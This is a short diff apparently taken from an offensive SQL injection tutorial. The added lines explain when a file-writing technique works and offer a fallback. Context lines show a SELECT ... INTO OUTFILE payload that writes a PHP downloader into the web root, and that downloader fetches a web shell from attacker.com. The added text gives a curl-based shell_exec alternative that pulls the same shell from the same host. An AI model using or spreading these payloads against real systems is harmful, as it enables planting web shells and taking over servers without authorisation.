@@ -110,6 +110,8 @@ If the query length is limited, write a small downloader to fetch the full shell
 SELECT '<?php fwrite(fopen("shell.php","w"),file_get_contents("http://attacker.com/shell.txt"));?>' INTO OUTFILE '/var/www/html/downloader.php';
 ```
 
+**Prerequisite:** This technique requires `allow_url_fopen=On` in php.ini (disabled by default on hardened systems). Alternatives when disabled: use curl (`shell_exec("curl -o shell.php http://attacker.com/shell.txt")`) or stage the payload locally via another SQL injection write.
+
 ### Writing Multiple Lines
 
 For multiline content, you can use string concatenation and CHAR():
